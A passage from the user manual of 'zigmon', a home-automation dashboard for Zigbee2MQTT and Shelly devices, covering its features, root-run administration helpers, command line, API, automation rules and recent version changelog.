goes out then, instead of a dozen during the day: what the month has drawn
so far and which sockets drew most of it, how many rules fired and how many
switches happened, which devices have gone quiet past the patience their
kind is allowed, which batteries are at or below 30 %, which sockets are not
answering, and the worst warning of the day. Empty means none.

## Watching over things

Two things nobody watches for themselves, both under Control → System →
*Watching over things*:

- **A device that has gone quiet.** A thermometer speaks every few minutes
  and a PIR at least when somebody walks past, so silence far longer than
  its kind ever manages means a flat cell, a lost route or a device that has
  left. Each kind has its own patience — a thermometer an hour, motion six,
  a radiator head three, a contact twelve, a button a week, a router fifteen
  minutes — and each is a setting. One word per device, not a repeated one.
- **A mesh that keeps losing devices.** Zigbee2MQTT says "left the network"
  one device at a time and a bad night buries the log in them; they are
  counted by the hour and said once, above the threshold you set.

**How devices reach the mesh** keeps which router each device goes through
and how often that has changed — a device that keeps swapping routers is one
whose commands sometimes take the long way round.

**Going back a step** keeps what each Save replaced, the last twenty by
default (`snapshots_keep`). *Put back* restores a version and keeps the
current one first, so a step back can be stepped forward again. A version
can be thrown away with the bin beside it, or the whole list at once with
*Throw them all away* — neither touches what is in force, and the next Save
starts the list again. It is not
the backup: a backup answers "how was it last week", this answers "what did
I just do".

## What it costs

The Overview carries a card in money: what the metered sockets have counted
since the first of the month, what that comes to by month's end at the same
daily rate (and how that compares with last month), last month itself, and
which sockets most of it went to. It uses the sockets' own totals, so it
counts what was used while the dashboard was not looking. `price_per_kwh`,
`standing_charge_month` and `currency` are settings.

## Find anything

**Ctrl+K** (⌘K) opens one search over every device, socket, room, scene,
sequence, rule, binding and tab. Arrows choose, Enter goes there, Escape
closes; the card it lands on is scrolled to and outlined for a moment.

## Action groups

The other way round: several things switched under one name. *The lights
downstairs*, *everything in the workshop* — pick the sockets, lights, Zigbee
switches, valves or rooms that belong together, and the group appears in
every target column under 🎯 *Action groups*. Unlike a scene, which is a
fixed list of actions, a group is a **target**: one button can switch it on
and another off, a rule can drive it, a schedule can turn it off at
midnight. Groups cannot contain groups.

## Sensor groups

Several sensors read as one. *Any PIR downstairs*, *how many windows are
open*, *the coldest room*: pick the sensors, the reading to take from each,
and how to put them together — **any**, **all**, **how many are on**, the
**sum**, the **average**, the **highest**, the **lowest**, or the **gap**
between the ends. The group then behaves like any other source: a rule can
watch it, the History tab can chart it, an alert can quote it, and it sorts
into its own 🧩 part of every source list.

Two filters keep a group honest. **Quiet after** leaves out members that
have said nothing for that many minutes, so a sensor that has stopped
reporting cannot drag an average along with a reading from last week; and
**room** counts only the members in one room, so a single group kept for a
whole floor can be asked about the bedroom. What was left out is shown
beside the group's current value.

It also remembers **which member last moved it**, which is what makes a group
worth having in an alert: the message can say `{group}` and `{value}` for the
group as a whole, and `{trigger}`, `{trigger_value}`, `{trigger_ago}` and
`{members}` for the sensor that actually set it off — *"PIR downstairs says
1 — moved by PIR-Kuchyne, 3 sensors"*. Groups live under Control →
Automation with the same sections, drag handles, right-click menu and hover
readings as the other editors.

## Where the time goes

Control → System → **Where the time goes** shows, live, every stretch
between a press and a click, so a lag can be placed rather than guessed at:

- *daemon: message → dashboard* — from the broker handing over a report to
  this page being woken (a millisecond or so);
- *daemon: status build*, *clock thread late by*, *writes waiting* — the
  daemon's own work, and whether the machine is keeping up with it;
- *browser: last repaint* — how long this page took to draw the last update;
- *broker round trip* — a message out and back through mosquitto;
- *Zigbee command → device echo* — from publishing a `set` to the device
  reporting the new value back: a router answers in a few hundred
  milliseconds, a sleeping head when it wakes;
- one line per Shelly box — how long it took to answer its last poll.

Green is fine, amber is worth a look, red is where the lag lives. `zigmon
--diag` prints the same figures first. The network-map scan, which makes the
coordinator walk the whole mesh for several seconds while commands wait,
now runs every half hour rather than every five minutes
(`networkmap_interval`).

## Looked after by root

Four things on the dashboard need root, and the daemon - which runs as
`zigmon`, with a read-only view of the system - never gets it. It writes what
is wanted into `/var/lib/zigmon/root/request.json`; a systemd path unit,
`zigmon-root.path`, starts `zigmon_root.py` as root for that one request. The
helper opens the folder by its descriptor without following links, checks
every value again, does the work, and writes back what it did. A new version
goes the same way through `zigmon-upgrade.path` and `zigmon_upgrade.py`.
Everything here is an administrator's, reads included, however the rest of the
view is set. The panes are drawn as otp draws its own, so the two look after
a machine the same way.

**Firewall** (Control - Firewall). Three lists say who may reach the
dashboard, the one-tap links and the SMS gateway's push; they are written into
nginx as `allow` lines between `# DASHBOARD-ALLOW-BEGIN` / `END` (and
`LINKS-`, `SMS-`) markers, `127.0.0.1` and `::1` always among them, checked
with `nginx -t` and put back when it fails. Switched on, the firewall gets
what zigmon's functions need - SSH, ICMP, DHCPv6, the web ports to the same
addresses as the lists, the broker, sensor pushes when they are on, mDNS - each
of which can be turned off, and before them your own rules in their order.
With iptables that is a chain `ZIGMON-IN`, first in INPUT, kept in
`/etc/sysconfig/iptables` and `ip6tables`; with firewalld rich rules in the
active zones at priorities before the zone's own services. Your other rules
are never changed, and nothing is shut by it: what it does not let in goes on
to them. A list or a DROP that would shut out the address the dashboard is
used from is refused; what is wanted is put in again by itself when somebody
changes it by hand, but not again after root refused it.

**Certificates** (Control - Certificates). The files nginx's
`ssl_certificate`, `ssl_certificate_key` and `ssl_trusted_certificate` name,
which the broker's TLS port reads too. Upload PEM in any order, or one PFX
with its password; or make a request (CSR) here, whose key waits on this
machine until the certificate comes back; or a self-signed one. The key must
belong to the certificate and the certificate must not have run out; owner
and mode are kept, `nginx -t` is asked before reloading, and mosquitto is told
to read them again (2.0 and later do so without dropping a device). How TLS is
spoken: standard, Mozilla intermediate or modern, or a list of your own; DH
parameters (an RFC 7919 group, or made here); HSTS. You are told 21, 7 and 1
day before the certificate runs out.

**Upgrades** (Control - Upgrades). Drop `zigmon-X.Y.Z.tar.gz` on the page.
Its `MANIFEST.sig` is checked against the release keys installed in
`/usr/local/lib/zigmon/release-keys` before anything else; a package not
signed, signed by somebody else, changed after signing, carrying a file nobody
signed for, or older than what runs is refused. Upgrading makes a backup of
the whole installation and a copy of the program first, runs
`install.sh --upgrade --yes`, and asks the new version whether it answers;
when it does not within a minute and a half, or install.sh fails, the copy is
put back by itself. Going back to an older version is done on the command
line, or (5.22) under *Going back to an older version* - shown once *Offer
going back to an older version* is switched on (5.23): the older program is
put in and the database left as it is, where no version between the two
changed how it is read - otherwise it is refused and says why. The very first
upgrade to 5.18 is done on the command line too - it is what installs the two
path units.

**The whole installation** (Control - Backup). The database, the
configuration, nginx with the certificate and its key, the broker with its
users and ACL, the firewall, the units and sudoers, and Zigbee2MQTT's backup,
in one `zigmon-full-<host>-<time>.tar.gz` in `/var/backups/zigmon`, readable
by root only and sealed with a key only root has (`/var/lib/zigmon-root`), so
this machine knows its own. Made every night after the database backup
(`full_backup_nightly`, keeping `full_backup_keep`), before every upgrade and
before every restore. A download is handed over once, optionally locked with
a password (AES-256, PBKDF2), and deleted after it. Any part of a backup made
here can be put back from the page; from a file made elsewhere only the
database, the configuration, the certificate (to the files nginx reads now)
and Zigbee's backup - nginx, the broker, the firewall and the units only by
root on the command line, because putting those back from an uploaded file
would make any administrator of the page root.

```bash
sudo zigmon --full-backup                 # one now
sudo zigmon --full-inspect FILE           # what is in it, and whether this machine made it
sudo zigmon --full-restore FILE --parts database,config,web,tls,broker,firewall,system,zigbee
zigmon --root-status                      # what root last did, and what it saw
```

**Network** (Control - Network, 5.21). The machine's address - set by hand or
from DHCP - its gateway, DNS servers, search domains, IPv6 and host name, put
in by root through NetworkManager with this machine's line in `/etc/hosts`,
and then the whole machine restarts, so nothing is ever half changed. Back
up, it checks that it has its new address and waits `net_confirm_min`
minutes (10) to be kept: press **Keep it** on the banner at the top of every
page once the dashboard answers at the new address, or run
`zigmon --change-keep net` on the machine. Not kept in time - or come up
without the address at all - the network it had comes back by itself, with
another restart. What knows the house by its old address is not told: the
Shelly boxes reporting here, Zigbee2MQTT, the server in front, the router's
reservation, a certificate naming the address. The firewall and who may reach
the pages are kept on trial the same way, for `fw_confirm_min` minutes (5):
not kept, what was there before comes back by itself.

**Time** (Control - Time). The clock as chrony keeps it - how far off the
time servers, what it follows, every source - and the time servers zigmon
sets for it, between marks of its own in `/etc/chrony.conf` (the file's own
lines commented out while it does, put back as they were when it stops):
`iburst`, preferred, NTS, how far it may step and when, how many sources must
agree, who may ask this machine for the time, and the time zone. A clock out
of step is said as an alert: every schedule, sunrise scene and one-tap code
runs on it. **Step it now** sets it at once.

**Restart and power off** (Control - Restart and power off). The machine
restarted or switched off now, or at an hour of its own clock up to a month
ahead (called off as easily), and a regular restart daily or weekly
(`reboot_auto`, `reboot_at`, `reboot_day`). The page follows it down and up
again.

**Backups to other machines** (Control - Backup). The backup of the whole
installation, locked with the password of the backups, sent to an FTP, FTPS,
SFTP, SCP or SMB server on a schedule or with *Back up now*, old ones taken
away by count and age; listed, downloaded and put back from there.

**A new version from the web** (Control - Upgrades). `upgrade_url` - by
default this project's release folder on GitHub - is looked at once a day; a
newer zigmon found there is offered, fetched and checked exactly like a
package dropped on the page. Nothing is put in by itself.

### Console

`sudo zigmon --console` opens menus for everything the command line does:
arrows and Enter, digits to jump, Esc back, `/` to filter a list, `!` for a
shell, `q` to leave. Live views (the log, the journal, the broker) follow new
lines; Up pauses, End follows again, and typing filters like `grep -i`. Root
lands in it at login, at the machine's own screen or over SSH, unless
`zigmon --console-at-login off` is set; a command run over SSH, scp/sftp, or
`ssh -t host ZIGMON_NO_CONSOLE=1 bash -l` gets the plain shell. The same
switch is on the dashboard, under Control - About. The install
sets it on, an upgrade keeps your choice, and `install.sh --uninstall` removes
`/etc/profile.d/zz-zigmon-console.sh` and the flag `/etc/zigmon-console-login`.

```bash
zigmon --changes                          # a new network or firewall change waiting to be kept
zigmon --change-keep net                  # keep it (net or fw)
zigmon --change-back fw                   # put the old one back now
sudo zigmon --upgrade-check               # is there a newer zigmon at upgrade_url?
sudo zigmon --upgrade-online --yes        # fetch it, check it, put it in
zigmon --rbackup-status                   # how the backups to other machines went
zigmon --rbackup-now                      # one now
```

## Command line

```bash
zigmon --status                       # every device with its latest readings
zigmon --devices                      # the device table
zigmon --history Temp-Balkon --range 7d --keys temperature,humidity
zigmon --events                       # the event log
zigmon --watch                        # live feed straight from the broker
zigmon --watch --bridge --raw         # including bridge/* topics, untruncated
zigmon --permit-join on               # open the network for four minutes
zigmon --plug                         # every plug, live from the device
zigmon --plug-on Lednice              # switch a plug; also --plug-off, --plug-toggle
zigmon --plug-pulse Lednice --ms 3000 # flip, hold 3 s, flip back
zigmon --plug-reset Lednice --types aenergy,switch_on
zigmon --bindings                     # which button action drives which plug
zigmon shelly Lednice dump            # the Shelly toolkit, see below
zigmon --reset-data history           # erase: all, history, events, or a device name
zigmon --check                        # is the whole system healthy
zigmon --diag                         # settings, API latency, database size
zigmon                                # run the daemon in the foreground
```

## The full Shelly toolkit

Everything the standalone Shelly reader in upsmon could do, ported whole and
addressed by the name a device has in the configuration — the address and
password come from there. Each command has its own `--help`.

```
zigmon shelly [NAME] <command> [options]
```

| reading | |
|---|---|
| `discover` | find Shelly devices on the LAN over multicast DNS, with a diagnosis when nothing answers |
| `info` | identity, firmware, auth and Matter state |
| `dump` | every value the device exposes, every component |
| `methods [COMPONENT] [--examples]` | every RPC method it supports, with a note on what each is for |
| `poll` | a live table. `--interval`, `--count`, `--csv FILE` |
| `watch` | the same, pushed over the device's websocket |
| `listen`, `serve` | receive webhooks, or an outbound websocket |

| controlling | |
|---|---|
| `on`, `off`, `toggle` | switch the relay |
| `reset-counters [type…]` | no type means every counter |
| `reboot [--wait]` | restart, optionally waiting for it to come back |

| configuring | |
|---|---|
| `config [COMPONENT] ['{JSON}']` | read or write a component's settings — a write is read back and the keys the firmware dropped are listed |
| `matter status\|on\|off\|code` | Matter, and the pairing code |
| `ble status\|on\|off\|rpc-on\|rpc-off` | radio and RPC over Bluetooth |
| `call METHOD ['{JSON}']` | anything the above does not cover |

```bash
zigmon shelly Lednice dump
zigmon shelly Lednice config switch:0 '{"auto_off": true, "auto_off_delay": 300}'
zigmon shelly Lednice ble on --reboot
zigmon shelly Lednice methods Switch --examples
zigmon shelly --host 172.16.16.13 --password secret info
zigmon shelly discover
```

`--host`, `--password`, `--switch-id`, `--json` and `--no-color` work
anywhere, before the command or after it. With no name, the first
configured plug is assumed. `watch` needs a device without a password, the
websocket carrying no authentication. `discover` does not cross subnets.
`ble` and `matter` take effect after a reboot, which `--reboot` will do.

## Sensors over RPC and webhooks

```json
"sensors": [{"name": "HT-Sklep", "host": "172.16.16.13", "password": ""}],
"sensor_listen": true,
"sensor_listen_host": "0.0.0.0",
"sensor_listen_port": 8088
```

A sensor with an address is polled like a plug; while it sleeps the poll
simply fails quietly. A battery sensor pushes instead — point its webhook at
`http://<this-host>:8088/?t=${ev.tC}&rh=${ev.rh}&id=NAME` (`bp` for battery
percent, `bv` for volts, `rssi`). JSON bodies are accepted as well. Each
source becomes a device like any other; `zigmon shelly listen` shows what
arrives without recording it, and the Control tab's daemon card counts the
pushes.

## API

Read endpoints are open on the loopback; everything that changes something
requires `X-Zigmon-Token` and a sign-in (`X-Zigmon-Session`, as the relay
sends it), or the root command line's key (`X-Zigmon-Cli`).

| endpoint | returns |
|---|---|
| `GET /api/status` | every device: identity, latest values with labels and units, verdict and reasons; the bridge; counts |
| `GET /api/health` | daemon uptime, broker connection, message count, database statistics |
| `GET /api/devices` | the device list (same shape as in status) |
| `GET /api/device?id=NAME` | one device, plus the keys it has history for and the full exposes map |
| `GET /api/history?device=NAME&keys=temperature,humidity&range=24h&points=600` | rows of `{ts, key…}`, hourly beyond two weeks |
| `GET /api/events?limit=100&device=NAME` | the event log |
| `GET /api/keys?device=NAME` | which values have history |
| `POST /api/auth/login` | `{"name": "…", "password": "…"}` → `{"token", "who", "must_change"}`; the relay keeps the token in its cookie |
| `POST /api/auth/logout` | ends this sign-in |
| `GET /api/auth/whoami` | `{"who": {"name", "role", "must_change"} or null, "public_view"}` |
| `POST /api/auth/password` | `{"old": "…", "new": "…"}`; every other sign-in of the account ends |
| `GET /api/accounts` | the accounts and who is signed in - an administrator's |
| `POST /api/accounts` | `{"action": "add|role|password|disable|enable|note|delete", "name": "…", …}` |
| `POST /api/sessions` | who is signed in; `{"end": ID}` ends one |
| `POST /api/permit-join` | `{"enable": true, "time": 254}` |
| `POST /api/reset` | `{"scope": "all|history|events|device", "device": "…"}` |

The plugs:

| endpoint | returns |
|---|---|
| `GET /api/plugs` | every plug: state, live figures, each counter with its value and the date it started from |
| `GET /api/plug?name=Lednice&refresh=1` | one plug, optionally read again first |
| `POST /api/plug/switch` | `{"name": "Lednice", "on": false}`, `{"name": "…", "toggle": true}` or `{"name": "…", "pulse": true, "ms": 5000}` — an operator's |
| `POST /api/plug/reset` | `{"name": "Lednice", "types": ["aenergy"]}`, or `[]` for every counter — an administrator's |
| `GET /api/bindings` | the button bindings |
| `POST /api/bindings` | `{"bindings": [{"device": "Button", "action": "single", "plug": "Lednice", "do": "toggle"}]}` — replaces the list, an administrator's. `do` is `toggle`, `on`, `off` or `pulse` with `pulse_ms`; `plug` may be `*` for every plug, and the same button and action may drive any number of rows — all matching rows fire in parallel |

**Devices can be renamed and deleted from the Devices tab.** Renaming a
Zigbee device goes through Zigbee2MQTT itself (`bridge/request/device/rename`),
so the friendly name — and the MQTT topic — change everywhere, permanently;
history stays, because everything is keyed by the IEEE address. A Shelly
seen over MQTT or a webhook gets a dashboard alias instead (the topic cannot
be renamed from here); the table then shows the alias with the topic
underneath. Plugs and sensors added on the Control tab are named there.
Deleting a device erases every reading, event and snapshot recorded for it,
and takes out any binding or rule that used it as the source (each removal
is logged); a plug used as the *target* of other rules stays, since the plug
itself was not deleted. If the device reports again it simply reappears,
fresh, under its default name. Bindings and rules store the device id, not
the name, so renaming breaks nothing. `POST /api/device/rename`.

**Zigbee switches are targets too.** Anything in the network with a
settable on/off state — a SONOFF ZBM5 wall-switch channel, a bulb, a relay
module — appears in the binding and rule editors marked ⚡ alongside the
Shelly plugs, one entry per channel (`Svetla · L1`). The daemon drives them
by publishing `{"state_l1": "ON"|"OFF"|"TOGGLE"}` to
`zigbee2mqtt/<name>/set`; toggle and pulse work (a pulse with an unknown
current state falls back to a blind double TOGGLE), the switch's own report
comes back through the bridge and repaints the dashboard, and every command
is logged as an event with its origin. `*` (all plugs) deliberately never
includes them. The daemon's broker account must be allowed to **write**
`zigbee2mqtt/+/set` — if commands vanish silently, that is the mosquitto
ACL (`topic readwrite zigbee2mqtt/#` for the zigmon user covers it).

**Thermostatic valves.** A radiator head — an IMMAX NEO 07703L, a Moes, any
Tuya TS0601 head, a Danfoss — is a device with values to set rather than a
state to flip, and it is handled as one. Its card shows what it measures,
what it is holding and how far the valve is open, and carries the controls:
**Target − 21.5 °C +** and the modes the head itself names (*off · heat ·
auto*, or its presets). Half a degree per press, within the limits the head
reports.

The same things are targets everywhere else: in the binding, rule, scene,
schedule and presence-trigger editors the head appears as
`TRV-Obyvak · target temperature` and `TRV-Obyvak · mode`, and the *Do*
column offers **set to …** with a number box carrying the head's own range,
or the list of its modes. So *at 06:30 on weekdays set the living-room head
to 21.5*, *when everybody leaves set every head to 16*, *the hall button
sets the bedroom head to 18* are all ordinary entries — a schedule, a
presence trigger, a binding.

Underneath it is one publish of `{"current_heating_setpoint": 21.5}` or
`{"system_mode": "off"}` to `zigbee2mqtt/<name>/set`, logged as an event
with its origin. A valve is a sleeping device: it collects what was sent for
it when it next talks to the mesh, which is anywhere from seconds to a few
minutes, so nothing waits on a confirmation — the card repaints when the
head reports its new state itself. Pairing is Zigbee2MQTT's business; once
it is in the network zigmon picks it up like any other device.

**Notifications.** Configure a channel in `config.json` — `notify_ntfy`
(a topic URL such as `https://ntfy.sh/moje-tajne-slovo`; subscribe to the
same topic in the ntfy app) and/or `notify_telegram_token` +
`notify_telegram_chat` — and pick on the Control tab what is worth a push:
critical problems, warnings, devices going quiet, every rule that fires.
The same story repeats at most once per 15 minutes; there is a test button.
Below the global choices sits a per-device list: any plug or sensor can be
set to **mute** (nothing about it, ever), **critical only**, or
**everything about it** (warnings, going quiet, rules touching it) —
overriding the global choices for that one device.

**Scenes** are named bundles of actions ("Vecer": lamp on, chandelier off,
TV plug on) edited on the Control tab, runnable from there and available as
🎬 targets for button bindings and rules. A step can carry **after N s**
(from the scene start, fractions allowed): steps without it fire at once,
together, so `0 / 2 / 5` makes a small cascade.

**Rules: AND or OR between the two conditions.** The second condition
(already there for "occupancy AND temperature", say) now has an AND/OR
choice. Two PIRs covering one room: one rule `occupancy ≥ 1 OR occupancy ≥ 1`
(the two sensors) → on; a second `occupancy ≤ 0 AND occupancy ≤ 0` → off,
so the light turns on the moment either one sees motion and off only once
both have gone quiet — two rules instead of four. Applies to both live
firing and Dry run.

**A strip's sockets switch in the order written.** A Shelly strip has no
"set them all" call — every socket is its own `Switch.Set` — so a scene that
switches four of them sends four commands. They used to go from four
threads at once and land in whatever order the threads happened to run, so
the strip clicked in a different order every time. Now the k-th command to
the same box in a scene waits k × `plug_command_gap` (20 ms) before it goes:
the order is the order the actions are written in, every time, and a
four-way strip is done inside a tenth of a second. Drag the actions in the
scene to choose the order.

**The automation itself can be switched.** A rule, a schedule, or a whole
section of button bindings is a target like any other, so *away* can silence
the motion rules and a button can turn the bedroom's buttons off for the
night: pick 🧰 *the rule …*, 🧰 *the schedule …* or 🧰 *the buttons in "…"*
in any target column and give it **on**, **off** or **toggle**. A rule
switched off keeps its place and simply does not fire.

**Sequences** turn one button into a cycle: the first press runs step 1,
the next press — minutes or days later — step 2, and so on, then around
again; the position is remembered across restarts. A step is a scene — many
targets at once or with delays — or any single target with an action: a
plug on, a light off, a valve set to 19, a room's heating to night. Bind a
button to
the 🔁 entry to advance; bind another button (or the same button's long
press) to the ↺ entry to run the optional *reset* — a scene, or a single
target with an action, all off say — and start over. Edited on the Control tab, with Advance/Reset buttons and
a "next press: step N — scene" line.

**Rules grew up.** Besides the clock window: an optional **AND** condition
against any second reading (`occupancy ≥ 1 AND illuminance ≤ 50`), a
**must-hold-for** time in seconds (no motion for 600 s, a washer under 5 W
for 180 s — the stretch completes even if the source goes quiet), a
**way-back threshold** folding a hysteresis pair into one rule (`≥ 65 → on,
back at 55` switches off past 55), and windows that take **sunrise/sunset**
with minute offsets (`sunset-30`–`23:30`; set `latitude` and `longitude`
in `config.json`).

**Energy** on the Overview: today / yesterday / this month / last month /
this year / last year per plug, with an **All plugs** total row at the
bottom when there is more than one — click its name for the same 30-day
bar chart as any single plug, summed across all of them, computed reset-proof from the meters' own counters; set
`price_per_kwh` (and `currency`) to see money next to the kWh. On the
Control tab, an **Energy summary** card restarts those sums from zero, now,
per plug or for all — a baseline marker, not a data wipe: history and the
plug's own meters stay, and a restarted plug carries ↺ next to its name.

**Settings on the dashboard.** The safe-to-change slice of `config.json`
lives in a Settings card on Control: alert thresholds, polling intervals,
price/currency, latitude/longitude, notification channels. Saved values are
stored in the daemon's database, apply immediately (no restart) and win
over the file; putting a value back to what the file says drops the
override, and overridden fields carry a blue edge with the file's value in
the tooltip. Connection, ports and paths stay file-only.

**Database card** (Control): the file's size and row counts, the last
roll-up, **DB latency** (a trivial read and write, measured by the daemon)
and **app latency** (browser → daemon → back, plus the daemon's own time to
answer), with four buttons — **Check integrity** (SQLite's own check),
**Optimise** (ANALYZE + VACUUM; pauses writes while it runs), **Back up
database now** (a consistent copy via SQLite's online backup, into the
backups folder, kept `backup_keep` deep) and a **list of the backups on the server**,
each with **Download** (the file itself, to keep off-site), **Restore**
(replaces the live contents; the state right before is saved as its own
backup first, so a mistaken restore can be undone) and **Delete**; plus
**Upload a backup** to put a file back into the list — it travels in pieces
of a few MB and is checked to be a healthy zigmon database before it is
accepted. (Uploads need `client_max_body_size 6m` in nginx; the upgrade
raises it from the old 16k.)

**Backup**: one button downloads every dashboard-made setting (devices with
passwords, bindings, rules, scenes, layout, aliases, notification choices)
as a JSON file; import replaces them wholesale. The dashboard also carries
a PWA manifest, so "Add to home screen" gives it an icon and a standalone
window on a phone.

**Sensor rules** drive a plug from any numeric reading, not just a button:
source device, value, comparison (≥ ≤ > <), threshold, plug (or all plugs)
and the action, including pulse. Any device with numbers works as a source —
a thermometer, a plug's own power draw, Wi-Fi signal, battery. Rules are
edge-triggered: one fires when its condition **becomes** true, not on every
report while it stays true, and a per-rule cooldown (default 300 s) stops a
value dancing on the line from hammering the relay. Two rules make a
thermostat with a dead band: `temperature ≥ 30 → on`, `temperature ≤ 27 →
off`. Each rule can be limited to a **clock window** (`from`/`to`, `22:00`–`06:00`
crosses midnight; empty means around the clock) and can name a **safe state
for when the window closes** (`window_end`: `off` or `on`) — a
motion-driven light is switched off when its night window ends, whether or
not anyone walked past at that moment, and the rule re-arms freshly when
the window opens again. Outside its hours a rule does not fire at all.
Yes/no readings — occupancy, contact, ON/OFF states — count as 1 and 0, so
`occupancy ≥ 1 → on` with the sensor's own clear-timeout makes a motion
light. Edited on the Control tab, which shows each rule's current reading
and whether it holds; `GET/POST /api/rules`; `zigmon --rules` on the
command line.

A **pulse** flips the socket and flips it back after the delay: off → wait
→ on when the plug is on (a power-cycle for whatever is plugged in), on →
wait → off when it is off. The way back is retried three times and, if it
still fails, logged as a critical event; a second pulse while one is running
is refused.

Plugs and sensors are managed on the **Control tab** — add, test, remove,
save behind a sign-in; the daemon starts polling at once, no restart. *Test*
asks the device who it is and fills in whether it is a plug or a sensor;
*Find Shelly devices* runs a multicast DNS query from the server and offers
what answered on this subnet. Passwords are kept in the daemon's database
(readable by the daemon alone) and never sent back to the browser — the
field shows "(kept)" and stays blank. The same endpoints:

| endpoint | |
|---|---|
| `GET /api/managed` | plugs and sensors, without passwords |
| `POST /api/managed` | `{"plugs": [...], "sensors": [...]}` — replaces the dashboard-managed list; omit `password` to keep it, `clear_password: true` to drop it |
| `POST /api/managed/test` | `{"host": "…", "password": "…"}` → model, firmware, whether it has a switch |
| `POST /api/managed/discover` | what mDNS finds in three seconds |

Every entry can be **disabled without deleting it** — the State column on
the tab, or `"enabled": false` on the entry in `config.json` or in the
`POST /api/managed` body. A disabled plug or sensor is not polled, cannot be
switched and disappears from the lists, but its history stays, and bindings
and rules that point at it are kept (they simply do not fire, and the plug
shows as "(disabled)" in their editors) — enable it again and everything
carries on where it left off.

`config.json` still works and wins: entries under `"plugs"` and `"sensors"`
there are shown on the tab as read-only and cannot be duplicated from the
dashboard. `mqtt_name` is the device's own MQTT prefix (whatever its *MQTT prefix*
setting says — `plugtst`, `shellies/xxx`, …). Fill it in and two things
happen: the daemon does not record the device twice, and it **subscribes to
that prefix and learns about relay changes the instant they happen** — a
press of the button on the plug, its web page, the Shelly app. Without it,
an outside change waits for the next poll (up to `plug_poll_interval`,
15 s). With it, the dashboard repaints in well under a second, with the
source in the event ("switched on (button)"). A plug shows up as a
device like any other, so History and All values cover it too, and `zigmon
shelly NAME …` addresses both kinds of entry.

`device` and `id` accept the friendly name or the IEEE address.

## Broker account

The daemon needs a broker login with these rights (the installer can create
it in a local mosquitto):

```
user zigmon
topic read zigbee2mqtt/#
topic write zigbee2mqtt/bridge/request/#
topic read shellies/#
```

## What was verified

Without a broker in the build environment, against replayed messages from a
real Zigbee2MQTT 2.13 with Shelly BLU H&T ZB, BLU Button Tough ZB, a Shelly
H&T Gen3 and a Plug M Gen3 over `shellies/`:

* device discovery from `bridge/devices`, readings before the list arrives,
  rename, removal, availability, button actions, bridge events
* every API endpoint, token and PIN handling, erasing by scope
* the plugs against a mock Shelly Plug M Gen3 with SHA-256 digest
  authentication: polling, switching, per-counter resets including ones the
  firmware only pretends to clear, and a button press toggling the plug
  through a binding
* the dashboard driven in a headless browser through every tab, chart
  rendering, the PIN dialogue and a reset
* the whole Shelly toolkit against the same mock: info, dump, methods,
  config read and write with keys the firmware drops, ble and matter
  switches, on/off/toggle, counter resets, call, poll to CSV, reboot --wait,
  and the discovery diagnosis on a network with no answer
* a polled sensor, GET and POST webhook pushes, and a push carrying nothing usable
* the installer's dry run

Current version: **5.23.0**

5.23.0 — going back is offered only when asked for, and says what it takes away.

* **A switch, off by default**: *Offer going back to an older version*
  (`downgrade_show`, Control - Upgrades). Off, the card *Going back to an
  older version* is not shown, and the dashboard, `zigmon --downgrade
  VERSION` and the console do none of it; root on the command line can still
  go back with a package file (`sudo zigmon --downgrade FILE`), as the way
  out when the dashboard itself is what does not work.
* **What changed, for every version** in the card - an older one at
  `upgrade_url` or a package sent here: *What changed* shows the version's
  own entry and, above it, every version after it up to the one that runs -
  what going back to it takes away. Read from the changelog this version
  carries, which holds the entries of all that came before it: nothing is
  fetched for it.

The checks: root's helper, run straight away in them rather than through
`zigmon-root.path`, is run one at a time, as systemd runs it - the look at
the network and the clock (5.21) could otherwise take a certificate's request
from under it, and `test/admin.py` failed now and then.

5.22.0 — going back to an older version, without touching the database.

Control - Upgrades has a card of its own, *Going back to an older version*:
the older versions at `upgrade_url`, each said safe or not and why, a button
to go back to one, and a place to drop a package of your own. On the command
line `sudo zigmon --downgrade-check` and `sudo zigmon --downgrade VERSION`
(or a package file); in the console, Upgrades - Going back.

Going back puts the older program in and **leaves the database as it is** -
no backup of it is made and none is put back, so a database of any size goes
back in the time an upgrade takes. That is safe only while the older version
reads the database as the newer one left it, which in zigmon is all but
always: the database only grows. Where a version changed how it is read -
the accounts at 5.19.0, PIN accounts at 5.19.1 - going back across it is
refused, by root as well as on the page (`DB_EPOCHS` in
`deploy/zigmon_upgrade.py`, which a version that changes the database must
add to). The highest version that ever ran on the database counts, not only
the one installed: the daemon keeps it there (`version_high`). A copy of the
program is kept and put back by itself when the older version does not
answer; what it does not know of is taken away once it does (the console at
login, below 5.21). Not while a change of the network or the firewall waits
to be kept, or a restart is under way.

Checked by `test/downgrade.py` (new, failing on 5.21.0): the database is the
same byte for byte after going back.

5.21.0 — the machine itself, from the dashboard and its console.

Ported from otp 1.0.138, which looks after a machine the same way, with the
same pages and words where they fit:

* **Network** (Control - Network): the address by hand or from DHCP, the
  gateway, DNS, IPv6 and the host name, put in by root through
  NetworkManager with a restart of the machine - **on trial**: not kept
  within `net_confirm_min` minutes of coming back up (on the banner, or
  `zigmon --change-keep net`), or come up without its new address, the old
  network comes back by itself. The page follows the server to its new
  address.
* **The firewall on trial**: saving it, or who may reach the pages, is kept
  only when somebody says so within `fw_confirm_min` minutes; otherwise what
  was there before comes back by itself.
* **Time** (Control - Time): chrony's state and sources, the time servers
  (iburst, preferred, NTS), stepping, who may ask for the time, the time
  zone; an alert when the clock is out of step. install.sh installs chrony.
* **Restart and power off**: now, at an hour of its own clock (called off as
  easily), or regularly (`reboot_auto`).
* **A new version from the web** (Control - Upgrades): looked for once a day
  at `upgrade_url`, offered, fetched and checked exactly like a package
  dropped on the page; `zigmon --upgrade-check`, `--upgrade-online`. With
  more than one newer version there, which one to go to is chosen from a
  list (the newest first); with one, the card is as it always was.
* **Backups to other machines** (Control - Backup): FTP, FTPS, SFTP, SCP and
  SMB, locked with the password of the backups, on a schedule, with
  retention, listed and put back from there; `zigmon --rbackup-now`.
* **The console**: `zigmon --console`, menus for everything the command line
  does, opened by itself when root signs in at the machine or over SSH
  (`zigmon --console-at-login on|off`).
* **About** (Control - About): the version, how long it has run, what it
  runs on - Python and its modules, the libraries under them, mosquitto,
  chrony, nginx, php-fpm and the PHP of the pages with its extensions, the
  system - and the switch for the console at login, put in by root.
* **The Settings menu** in groups as otp has it: Security, *Server* (Network,
  Time, Certificates, Restart and power off), *Data* (Backup, Data &
  database, Energy & charts) and *Monitoring and updates* (Diagnostics,
  Upgrades, All other settings, All values, About).

Root answers the network, the clock and restarting in files of their own
(`root/net.ask`, `root/ntp.ask`), never behind a backup that holds
`request.json` for minutes; `zigmon-root.path` watches them after
`install.sh --upgrade`.

